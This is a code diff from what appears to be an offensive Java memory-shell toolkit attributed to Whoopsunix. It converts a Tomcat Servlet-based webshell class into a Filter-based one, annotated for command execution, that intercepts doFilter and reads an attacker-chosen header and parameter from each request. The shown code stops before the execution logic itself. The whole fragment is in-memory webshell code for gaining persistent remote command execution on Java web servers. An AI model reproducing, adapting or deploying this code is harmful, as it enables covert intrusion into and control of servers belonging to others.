@@ -11,17 +11,18 @@ import java.lang.reflect.Method;
 
 /**
  * @author Whoopsunix
+ * <p>
  */
-@MemShell(MemShell.Servlet)
+@MemShell(MemShell.Filter)
 @MemShellFunction(MemShellFunction.Exec)
 @JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
-public class ServletExec implements InvocationHandler {
+public class FilterExec implements InvocationHandler {
     private static String HEADER;
     private static String PARAM;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
-        if (method.getName().equals("service")) {
-            run(args[0], args[1]);
+        if (method.getName().equals("doFilter")) {
+            run(args[0], args[1], args[2]);
         }
         return null;
     }
@@ -36,7 +37,7 @@ public class ServletExec implements InvocationHandler {
     /**
      * tomcat
      */
-    private void run(Object servletRequest, Object servletResponse) {
+    private void run(Object servletRequest, Object servletResponse, Object filterChain) {
         try {
             Object header = invokeMethod(servletRequest.getClass(), servletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
             Object param = invokeMethod(servletRequest.getClass(), servletRequest, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
